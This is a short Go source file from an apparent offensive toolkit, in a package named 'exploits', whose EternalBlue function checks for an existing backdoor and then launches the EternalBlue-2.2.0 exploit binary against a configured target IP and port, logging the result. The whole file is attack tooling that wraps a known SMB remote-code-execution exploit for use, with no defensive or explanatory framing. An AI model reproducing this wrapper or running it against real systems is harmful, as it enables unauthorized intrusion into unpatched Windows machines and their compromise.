package exploits

import (
	"eternal/conf"
	"eternal/metadatas"
	"eternal/utils"
	"os/exec"
	"path/filepath"
)

func EternalBlue() {
	if BackDoorCheck() {
		return
	}
	metadatas.MetaData.SetTarget("eb")
	cmd := exec.Command(filepath.Join(conf.Specials, "EternalBlue-2.2.0.exe"), "--InConfig", filepath.Join(conf.Specials, "EternalBlue-2.2.0.0.xml"), "--OutConfig", filepath.Join(metadatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metadatas.MetaData.TargetIp, "--TargetPort", metadatas.MetaData.TargetPort, "--Target", metadatas.MetaData.Target, "--NetworkTimeout", metadatas.MetaData.NetworkTimeout)
	metadatas.MetaData.ShowMetaData()
	utils.Execute(cmd)
}
